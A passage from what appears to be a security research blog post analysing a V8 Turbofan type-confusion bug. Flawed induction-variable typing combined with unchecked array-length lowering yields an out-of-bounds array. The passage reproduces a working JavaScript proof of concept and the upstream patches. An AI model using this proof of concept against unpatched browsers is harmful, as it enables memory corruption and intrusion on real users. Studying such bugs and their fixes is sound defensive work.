</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">kind</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">kStrict</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">bound_min</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">min</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">max</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">bound_min</span> <span class="o">+</span> <span class="n">increment_min</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// The lower bound must be at most the initial value&#39;s lower bound.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">min</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">min</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Min</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Shortcut: If the increment can be both positive and negative,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// the variable can go arbitrarily far, so just return integer.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">Type</span><span class="o">::</span><span class="n">Range</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">max</span><span class="p">,</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">zone</span><span class="p">());</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The comments provided in the source are self-explanatory. Upper and lower bounds get calculated if and only if <code>-increment_type.Max() &gt;= 0</code> or  <code>increment_type.Max() &lt;= 0</code> holds for subtraction or addition arithmetic operations accordingly. Otherwise, a <code>kInteger</code> type gets returned.</p>
<h3 id="triggering-a-type-confusion">Triggering A Type Confusion</h3>
<p>A type confusion vulnerability can be caused by a logical bug in the implementation of <code>TypeInductionVariablePhi</code> as this function does not take into account if the type of <code>increment_type</code> can become <code>NaN</code> through addition or subtraction of
Infinities during the execution of the for-loop, having the initial value of <code>initial_type</code> not being Infinity.</p>
<p>In order to understand the way to trigger this vulnerability, let&rsquo;s take a similar PoC as the one provided in the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug issue</a> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">trigger</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">trigger</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">trigger</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">trigger</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In this scenario, we will have the following:</p>
<ul>
<li><code>initial_type</code>: i = 0.</li>
<li><code>increment_type</code>: i += -Infinity.</li>
<li><code>arithmetic_type</code>: arithmetic type will be of type addition.</li>
</ul>
<p>This configuration will be ultimately interpreted as follows:</p>
<ul>
<li><code>both_types_integer</code> = <code>true</code>:
<ul>
<li>0 is of type <code>kInteger</code>, as it falls within <code>Range(-V8_INFINITY, V8_INFINITY);</code></li>
<li><code>-Infinity</code> is also of type <code>kInteger</code> as it falls within <code>Range(-V8_INFINITY, V8_INFINITY);</code></li>
</ul>
</li>
<li><code>maybe_nan</code> = <code>false</code>:
<ul>
<li>as 0 + <code>-Infinity</code> = <code>-Infinity</code>, which is of type <code>kInteger</code></li>
</ul>
</li>
<li>(<code>increment_min</code> &gt;= 0) == <code>false</code>:
<ul>
<li><code>increment_min</code> value will be <code>-Infinity</code></li>
</ul>
</li>
</ul>
<p>Therefore, <code>TypeInductionVariablePhi</code> for this case scenario will return a type of <code>kInteger</code>. However, that is only correct for the first iteration of the loop. But the loop will execute for a total of 3 iterations. The following would be the values for <code>initial_type</code> and <code>increment_type</code> per iteration:</p>
<table>
<thead>
<tr>
<th></th>
<th>First iteration</th>
<th>Second iteration</th>
<th>Third iteration</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>i</strong></td>
<td>0</td>
<td>-Infinity</td>
<td>NaN</td>
</tr>
<tr>
<td><strong>i += m</strong></td>
<td>-Infinity</td>
<td>+Infinity</td>
<td>-</td>
</tr>
</tbody>
</table>
<p>Therefore, for this specific for-loop instance Turbofan would infer <code>i</code> to be of type <code>kInteger</code>, being <code>Range(-V8_INFINITY, V8_INFINITY);</code> When in reality after the execution of the loop, <code>i</code> will be of type <code>NaN</code>, therefore leading to type confusion. This wrong type inference can be observed by analyzing the Turbofan&rsquo;s Typer phase with Turbolizer:</p>
<div style="text-align:center">
<img src="/2021-12-30-134638_948x785_scrot.png"/>
</div>
<h3 id="reducejscreatearray-analysis">ReduceJSCreateArray Analysis</h3>
<p>In conjunction with the previous vulnerability, there is an additional fault that enables this bug to be exploitable. This fault resides in the implementation of <code>JSCreateLowering::ReduceJSCreateArray</code>  held in <code>compiler/js-create-lowering.cc</code>.
The function <code>ReduceJSCreateArray</code> is in charge of the optimization of constructed arrays.
For sake of simplicity, the only relevant portion of this function to enable exploitation will be covered. That is the following code within <code>ReduceJSCreateArray</code> implementation:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">arity</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Node</span><span class="o">*</span> <span class="n">length</span> <span class="o">=</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ZeroConstant</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">capacity</span> <span class="o">=</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">kPreallocatedArrayElements</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">capacity</span><span class="p">,</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span> <span class="n">elements_kind</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="n">allocation</span><span class="p">,</span> <span class="n">slack_tracking_prediction</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">arity</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Node</span><span class="o">*</span> <span class="n">length</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetValueInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Type</span> <span class="n">length_type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">length_type</span><span class="p">.</span><span class="n">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Number</span><span class="p">()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// Handle the single argument case, where we know that the value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// cannot be a valid Array length.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">elements_kind</span> <span class="o">=</span> <span class="n">GetMoreGeneralElementsKind</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="n">elements_kind</span><span class="p">,</span> <span class="n">IsHoleyElementsKind</span><span class="p">(</span><span class="n">elements_kind</span><span class="p">)</span> <span class="o">?</span> <span class="nl">HOLEY_ELEMENTS</span>
</span></span><span class="line"><span class="cl">                                                            <span class="p">:</span> <span class="n">PACKED_ELEMENTS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">Node</span><span class="o">*&gt;</span><span class="p">{</span><span class="n">length</span><span class="p">},</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">elements_kind</span><span class="p">,</span> <span class="n">allocation</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">slack_tracking_prediction</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">length_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">SignedSmall</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="n">length_type</span><span class="p">.</span><span class="n">Min</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="n">length_type</span><span class="p">.</span><span class="n">Max</span><span class="p">()</span> <span class="o">&lt;=</span> <span class="n">kElementLoopUnrollLimit</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="n">length_type</span><span class="p">.</span><span class="n">Min</span><span class="p">()</span> <span class="o">==</span> <span class="n">length_type</span><span class="p">.</span><span class="n">Max</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">capacity</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">length_type</span><span class="p">.</span><span class="n">Max</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">capacity</span><span class="p">,</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span> <span class="n">elements_kind</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">allocation</span><span class="p">,</span> <span class="n">slack_tracking_prediction</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">length_type</span><span class="p">.</span><span class="n">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">UnsignedSmall</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="n">can_inline_call</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span> <span class="n">elements_kind</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="n">allocation</span><span class="p">,</span> <span class="n">slack_tracking_prediction</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">arity</span> <span class="o">&lt;=</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">kInitialMaxFastElementArray</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Gather the values to store into the newly created array.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can observe, depending on the number of arguments (arity) passed to the array constructor, different code-paths will be chosen. Ultimately, the effect of these code-paths based on the value of <code>arity</code> will be the following:</p>
<ul>
<li><strong>If <code>arity</code> is 0</strong>
<ul>
<li>length = 0</li>
<li>capacity = <code>JSArray::kPreallocatedArrayElements</code></li>
</ul>
</li>
<li><strong>If <code>arity</code> is 1</strong>
<ul>
<li>length = <code>NodeProperties::GetValueInput(node, 2)</code></li>
<li>if <code>length_type</code> != <code>Number</code>
<ul>
<li>capacity = <code>undefined</code></li>
</ul>
</li>
<li>if <code>length_type</code> == <code>SignedSmall</code> and <code>length_type</code> &lt;= <code>kElementLoopUnrollLimit</code>
<ul>
<li>capacity = <code>length_type.Max()</code></li>
</ul>
</li>
<li>else
<ul>
<li>capacity = <code>undefined</code></li>
</ul>
</li>
</ul>
</li>
<li><strong>else if <code>arity</code> &lt;= <code>JSArray::kINiitalMaxFastElementArray</code></strong>:
<ul>
<li>iterate through arguments, compute length and create new array</li>
</ul>
</li>
<li><strong>else</strong>:
<ul>
<li>return <code>NoChange()</code></li>
</ul>
</li>
</ul>
<p>We can observe based on the previous resumed overview of the implementation of <code>ReduceJSCreateArray</code> that if one argument is passed to the constructor, and that argument falls within the range of 0 &lt;= <code>length_type</code> &lt;= <code>kElementLoopUnrollLimit</code>, a new array will be created having its capacity initialized as <code>length_type.Max()</code>. The value of <code>kElementLoopUnrollLimit</code> is the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="c1">// When initializing arrays, we&#39;ll unfold the loop if the number of
</span></span></span><span class="line"><span class="cl"><span class="c1">// elements is known to be of this type.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">const</span> <span class="kt">int</span> <span class="n">kElementLoopUnrollLimit</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Therefore, by following this path we can abuse the creation of an array with OOB indexed property access, as the upper bounds of the newly created array will be set to  <code>lenght_type.Max()</code>.</p>
<h3 id="exploitation">Exploitation</h3>
<p>The PoC provided in the crbug issue shows how we can chain these two vulnerabilities to abuse the speculation of a wrongly assumed type inference. This PoC is the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="nx">k</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(-Inf, Inf) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(1024, Inf) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(-Inf, -1024) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(-1025, -1024) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                 
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(1024, 1025) -- reality: i = 0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(2, 3) -- reality: i = -1022 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(1, 1) -- reality: i = 1073741313 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>               
</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(11, 11) -- reality: i = 1073741323 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>      
</span></span><span class="line"><span class="cl">  <span class="c1">// capacity = 11, length = 1073741323 (OOB)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">trigger</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">trigger</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="mi">11</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mitigation">Mitigation</h3>
<p>After the report of this vulnerability, the following patches were applied. Is important to understand the scope of these patches as this would be relevant for the analysis and solution of Modern Typer.</p>
<h4 id="patch-applied-to-jscreateloweringreducejscreatearrayhttpschromiumgooglesourcecomv8v86516b1ccbe6f549d2aa2fe24510f73eb3a33b41a5e21f0">Patch applied to <a href="https://chromium.googlesource.com/v8/v8/+/6516b1ccbe6f549d2aa2fe24510f73eb3a33b41a%5E%21/#F0">JSCreateLowering::ReduceJSCreateArray</a></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index ff057a4..77da973 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/js-create-lowering.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/js-create-lowering.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -672,6 +672,9 @@
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>         length_type.Max() &lt;= kElementLoopUnrollLimit &amp;&amp;
</span></span><span class="line"><span class="cl">         length_type.Min() == length_type.Max()) {
</span></span><span class="line"><span class="cl">       int capacity = static_cast&lt;int&gt;(length_type.Max());
</span></span><span class="line"><span class="cl"><span class="gi">+      // Replace length with a constant in order to protect against a potential
</span></span></span><span class="line"><span class="cl"><span class="gi">+      // typer bug leading to length &gt; capacity.
</span></span></span><span class="line"><span class="cl"><span class="gi">+      length = jsgraph()-&gt;Constant(capacity);
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
</span></span><span class="line"><span class="cl">                             allocation, slack_tracking_prediction);
</span></span><span class="line"><span class="cl">     }
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="patch-applied-to--typertypeinductionvariablephihttpschromiumgooglesourcecomv8v8a2e971c56d1c46f7c71ccaf33057057308cc84845e21f1">Patch applied to <a href="https://chromium.googlesource.com/v8/v8/+/a2e971c56d1c46f7c71ccaf33057057308cc8484%5E%21/#F1"> Typer::TypeInductionVariablePhi</a></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 14ec856..4e86b96 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/typer.cc
